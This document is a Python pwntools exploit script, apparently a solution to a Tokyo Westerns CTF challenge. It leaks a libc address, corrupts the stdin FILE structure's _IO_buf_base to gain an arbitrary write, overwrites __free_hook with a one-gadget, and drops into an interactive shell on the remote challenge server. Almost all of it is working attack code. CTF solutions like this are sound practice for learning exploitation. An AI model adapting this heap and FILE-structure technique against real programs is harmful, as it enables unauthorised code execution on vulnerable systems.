#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "pwn2.chal.ctf.westerns.tokyo"
port = 31337

# Overwrite _IO_buf_base with null byte in the stdin structure
# You will have a stdin buffer in stdin structure
# It's can control the stdin buffer then you can write to arbitrary memory 

r = remote(host,port)

def alloc(size,data):
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)


alloc(32,"D")
alloc(48,"D")
alloc(128,"g")
alloc(128,"d")
r.recvuntil("d\n")
libc = u64(r.recvuntil("\n")[6:6+8]) - 0x3c4b78
print  "libc:",hex(libc)
io_buf_base = libc + 0x3c4918
alloc(io_buf_base+1,"") 
r.recvuntil(":")
free_hook = libc + 0x3c67a8
r.sendline("1".ljust(0x18,"\x00") + p64(free_hook) + p64(free_hook+0x40) + p64(0)*6)
for i in range(0x57):
    r.recvuntil("er:")
    r.sendline("")
r.recvuntil(":")
magic = libc + 0x4526a
r.sendline(p64(magic))
r.interactive()
